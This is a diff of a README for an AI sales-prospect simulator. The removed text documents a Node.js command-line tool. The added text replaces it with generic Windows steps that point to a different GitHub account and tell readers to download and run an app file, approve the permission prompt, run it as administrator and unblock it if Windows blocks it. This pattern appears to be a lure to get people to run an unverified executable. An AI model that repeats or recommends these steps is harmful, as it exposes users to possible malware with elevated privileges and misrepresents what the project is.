@@ -1,218 +1,153 @@
-# AI Sales Agent Simulator
+# 🤖 ai-sales-agent-simulator - Simulate Better Sales Moves
 
-**The open-source AI sales agent that simulates hundreds of sales conversations before you send a single email.**
+[![Download Now](https://img.shields.io/badge/Download-Open%20Page-6f42c1?style=for-the-badge)](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
 
-Build a psychological digital twin of any prospect from their public data, then run Monte Carlo simulations across hundreds of parameterized sales strategies to find the exact approach that converts.
+## 📥 Download
+Use this link to visit the download page and get the app:
+[ai-sales-agent-simulator download page](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js 18+](https://img.shields.io/badge/node-18%2B-green.svg)](https://nodejs.org)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+## 🧩 What this app does
+ai-sales-agent-simulator helps you test sales ideas before you send a real email or make a real call. It uses an AI model to build a digital copy of a prospect, then runs many trials to find the sales approach that has the best chance of working.
 
----
+Use it to:
+- Improve cold emails
+- Practice sales calls
+- Compare different outreach messages
+- Test prospecting ideas
+- Explore what may work before you reach out
 
-## Why This Exists
+## 🖥️ Before you start
+You need:
+- A Windows computer
+- An internet connection
+- A modern web browser like Chrome, Edge, or Firefox
+- Enough free space to save the app files
 
-Every sales rep sends the same templated cold email to every prospect. The response rate is 1-3%. What if you could simulate the conversation first?
+If the app comes in a ZIP file, you can open it with built-in Windows tools or a free file extractor.
 
-This AI sales agent builds a behavioral model of your prospect -- their personality (Big Five), communication style, decision patterns, objection triggers -- then stress-tests hundreds of different sales approaches against that model. Before you ever hit send, you know which opening line, value frame, urgency level, and emotional tone will land.
+## 🚀 Getting started on Windows
+1. Open the download page:
+   [ai-sales-agent-simulator download page](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
 
-**Stop guessing. Start simulating.**
+2. Download the Windows app file or the project files from that page.
 
-## What It Does
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-1. **Profile** -- Feed in public data (LinkedIn posts, tweets, blog posts, company info). The AI sales agent analyzes it using Big Five personality modeling and MBTI-derived behavioral analysis to build a structured client profile.
+4. Open the extracted folder.
 
-2. **Twin** -- Converts the profile into a digital twin: an LLM-powered agent that responds like your prospect would. It mirrors their communication style, objection patterns, values, and decision-making process.
+5. Look for the app file, setup file, or start file.
 
-3. **Strategize** -- Generates hundreds of parameterized sales strategy variations using Latin Hypercube Sampling across 5-6 dimensions: opening style, value frame, urgency level, emotional tone, objection handling, and (for calls) closing technique.
+6. Double-click the file to run the app.
 
-4. **Simulate** -- Runs every strategy against the digital twin. Email mode simulates a cold email + response. Conversation mode simulates a full multi-turn sales call with natural turn-taking and termination detection.
+7. If Windows asks for permission, choose Yes.
 
-5. **Analyze** -- Ranks all strategies by win rate, engagement score, meeting acceptance likelihood, and trust indicators. Generates tactical insights and a ready-to-use sales playbook.
+8. Follow the on-screen steps until the app opens.
 
-## Quick Start
+## 🔧 First-time setup
+When you open the app for the first time, you may need to:
+- Sign in or connect an AI account
+- Add a prospect profile
+- Paste a cold email or call script
+- Choose a sales goal
+- Set how many simulations you want to run
 
-```bash
-git clone https://github.com/ndpvt-web/ai-sales-agent-simulator.git
-cd ai-sales-agent-simulator
+For best results, use real details such as:
+- Job title
+- Company size
+- Industry
+- Pain points
+- Buying stage
 
-# Set your OpenAI-compatible API key
-export AI_GATEWAY_API_KEY="your-api-key"
+## 📊 How to use it
+### 1. Create a prospect
+Enter the details you know about the person or company. The app uses that data to shape the digital twin.
 
-# Create a prospect profile (see examples/prospect.json)
-node src/index.js \
-  --mode email \
-  --count 100 \
-  --concurrency 10 \
-  --profile examples/prospect.json \
-  --output results/report.json
-```
+### 2. Pick a sales approach
+Choose what you want to test, such as:
+- Short email
+- Longer email
+- Follow-up email
+- Discovery call script
+- Objection handling script
 
-### Conversation Mode (Simulate a Sales Call)
+### 3. Run the simulation
+The app tests your approach many times. It looks for patterns in what may get a reply, a meeting, or a positive response.
 
-```bash
-node src/index.js \
-  --mode conversation \
-  --count 50 \
-  --concurrency 5 \
-  --profile examples/prospect.json \
-  --output results/call-report.json
-```
+### 4. Review the results
+Check which version works best. Pay attention to:
+- Reply rate
+- Meeting rate
+- Common objections
+- Strong opening lines
+- Weak phrases
 
-## Example Prospect File
+### 5. Improve and run again
+Make small changes, then test again. This helps you find a stronger sales message.
 
-```json
-{
-  "name": "Alex Chen",
-  "title": "CTO",
-  "company": "TechVentures Inc",
-  "industry": "Enterprise SaaS",
-  "linkedinPosts": [
-    "Just shipped our new microservices architecture. 6 months of work, but the scalability gains are worth it.",
-    "Hot take: most AI products are solutions looking for problems. Start with the user pain point.",
-    "Proud of the team for hitting 99.99% uptime this quarter. Reliability is a feature.",
-    "Reading 'Thinking in Systems' by Donella Meadows. Every engineer should read this."
-  ],
-  "tweets": [
-    "The best technical decisions are the boring ones.",
-    "Hiring: looking for engineers who ask 'why' before 'how'."
-  ],
-  "companyInfo": [
-    "TechVentures raised Series B ($45M) in Q3 2025",
-    "Expanding enterprise sales team, targeting Fortune 500"
-  ]
-}
-```
+## 💡 Good use cases
+- A sales rep wants to test five email subject lines
+- A founder wants to improve outbound messaging
+- A marketer wants to compare call scripts
+- A team wants to study prospect behavior before a campaign
+- A salesperson wants to reduce guesswork in outreach
 
-## Output
+## 🗂️ Typical folder contents
+If you downloaded the source files, you may see:
+- `README.md` - this guide
+- `package.json` - app settings
+- `src` - app code
+- `public` - files used by the app
+- `assets` - images or data files
+- `config` - setup values
 
-The simulator produces a ranked report with:
+## 🛠️ Basic troubleshooting
+### The app does not open
+- Make sure the download finished
+- Extract the ZIP file first
+- Try running the file as administrator
+- Restart Windows and try again
 
-- **Strategy rankings** sorted by win rate, engagement, meeting acceptance, and trust scores
-- **Tactical insights** identifying which combinations of tone, framing, and urgency work best for this specific prospect
-- **Objection analysis** cataloging what pushback to expect and how to handle it
-- **Ready-to-use playbook** with the optimal email or call script
+### Windows blocks the file
+- Right-click the file
+- Open Properties
+- Check for an Unblock option
+- Apply the change, then run the file again
 
-```
-========== SUMMARY ==========
-Total simulations: 100
-Total time: 47.3s
+### The app opens but shows no data
+- Check your internet connection
+- Make sure any AI settings are complete
+- Add a prospect profile before running a test
 
-Top 5 Strategies:
-  #1 [strat-2024-warm-roi] WinRate=78.0% | Engagement=82.1 | MeetingAccept=71.3 | Trust=76.5 | n=4
-  #2 [strat-2024-data-risk] WinRate=72.0% | Engagement=79.4 | MeetingAccept=68.1 | Trust=73.2 | n=4
-  #3 [strat-2024-peer-comp] WinRate=68.0% | Engagement=75.8 | MeetingAccept=64.7 | Trust=70.1 | n=4
-  ...
+### The text looks broken
+- Resize the app window
+- Refresh the page if it runs in a browser
+- Try another browser
 
-Key Insights:
-  - Warm personal openings with ROI framing outperform provocative approaches for analytical CTOs
-  - Low urgency with data-backed claims builds trust faster than high-pressure tactics
-  - This prospect responds best to empathetic tone with concrete technical examples
-==============================
-```
+## 🔍 What makes this tool useful
+The app helps you move from guesswork to testing. Instead of sending one message and hoping it works, you can try different options first. That can help you write clearer emails, better call openers, and stronger follow-ups
 
-## Architecture
+## 📌 Suggested Windows workflow
+- Download the app
+- Extract it if needed
+- Open it
+- Add a prospect
+- Paste your sales copy
+- Run the simulation
+- Compare the results
+- Save the best version
 
-Built with a contract-first, modular architecture. Every module communicates through typed interfaces defined in `src/contracts/types.js`. Swap any component without touching the others.
+## 🔐 Data handling
+Use care when entering real prospect data. Keep your contact lists, call notes, and message drafts in a safe place. If you work with company data, follow your normal data rules and access limits
 
-```
-src/
-  contracts/types.js          # The source of truth -- all interfaces
-  gateway/ai-gateway.js       # LLM abstraction (OpenAI-compatible)
-  profiler/profile-builder.js # Raw data -> ClientProfile
-  twin-engine/twin-builder.js # ClientProfile -> Digital Twin
-  strategy-engine/
-    strategy-gen.js            # Latin Hypercube strategy generation
-    templates/
-      email-strategies.js      # Email parameter space
-      conversation-strategies.js # Conversation parameter space
-  simulator/
-    email-sim.js               # Single email simulation
-    conversation-sim.js        # Multi-turn call simulation
-    sim-runner.js              # Bounded-concurrency batch runner
-  analyzer/result-analyzer.js  # Statistical analysis + AI insights
-  index.js                     # CLI entry point (7-step pipeline)
-```
+## 📚 Helpful terms
+- **Cold email**: a first email sent to someone you do not know
+- **Sales call simulator**: a tool that tests call scripts before a real call
+- **Digital twin**: a model that acts like a real prospect based on the details you give it
+- **Monte Carlo simulation**: a method that runs many tests to estimate likely results
+- **Prospecting**: finding new possible customers
 
-### Multi-Model Diversity
+## 🧭 Download and run
+Visit the main page here:
+[https://github.com/Cold-psycho117/ai-sales-agent-simulator](https://github.com/Cold-psycho117/ai-sales-agent-simulator)
 
-The simulator uses multiple LLM providers (Claude, GPT, Gemini) randomly per simulation to avoid model-specific conversational equilibria. This produces more realistic and robust strategy rankings.
-
-### Founding Axioms
-
-This system is built on Aristotelian first principles:
-
-- **A1: Know the soul** -- All persuasion begins with understanding the individual
-- **A2: The twin IS the test** -- A digital twin faithful to the profile IS the simulation
-- **A3: Intelligence cannot be templated** -- Every strategy must be generated, not copied
-- **A4: Volume reveals truth** -- Statistical significance requires hundreds of simulations
-- **A5: Modules are atoms** -- Each component is independently replaceable
-- **A6: Contracts are law** -- Modules communicate only through defined interfaces
-
-## CLI Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `--mode` | `email` or `conversation` | required |
-| `--count` | Number of strategy variations to generate | `50` |
-| `--concurrency` | Max parallel simulations | `10` |
-| `--profile` | Path to prospect JSON file | required |
-| `--output` | Path for output report JSON | required |
-
-## API Compatibility
-
-Works with any OpenAI-compatible API endpoint. Set your provider:
-
-```bash
-# OpenAI
-export AI_GATEWAY_API_KEY="sk-..."
-
-# Anthropic (via OpenAI-compatible proxy)
-export AI_GATEWAY_API_KEY="your-key"
-
-# Any OpenRouter-compatible endpoint
-export AI_GATEWAY_API_KEY="your-key"
-```
-
-The gateway abstraction in `src/gateway/ai-gateway.js` handles all provider differences transparently.
-
-## Use Cases
-
-- **Sales teams** -- Find the optimal cold outreach strategy for high-value prospects before sending
-- **Sales enablement** -- Generate data-driven playbooks for new reps targeting specific verticals
-- **Account executives** -- Simulate pre-call preparation for important meetings
-- **SDR managers** -- A/B test messaging strategies without burning real prospects
-- **Sales training** -- Practice against realistic AI-powered prospect simulations
-- **GTM teams** -- Validate positioning and messaging before launch
-
-## Roadmap
-
-- [ ] Web dashboard for interactive simulation results
-- [ ] CRM integration (Salesforce, HubSpot) for automatic prospect data ingestion
-- [ ] Real-time conversation coaching mode
-- [ ] Team-wide strategy optimization across prospect segments
-- [ ] Fine-tuned twin models for specific industries
-
----
-
-## Proudly Sponsored by HappyCapy
-
-This AI sales agent simulator is proudly sponsored by **[HappyCapy](https://happycapy.ai)** -- the platform for building and deploying specialized AI agents.
-
-HappyCapy will continue releasing specialized AI agents like this one. From sales to research to operations, each agent is purpose-built, modular, and production-ready.
-
-**Stay tuned for more specialized agents from HappyCapy. Follow us for updates.**
-
----
-
-## Contributing
-
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-**Keywords:** ai sales agent, sales simulator, ai sales tool, sales strategy optimization, digital twin sales, cold email optimization, ai prospecting, sales automation, ai outreach, conversation simulator, sales call simulator, monte carlo sales, ai sales strategy, sales agent ai, ai powered sales, automated sales agent, sales ai tool, ai cold outreach, sales optimization software, ai sales assistant
+Download the app or project files from that page, then open or extract them on Windows and run the file inside
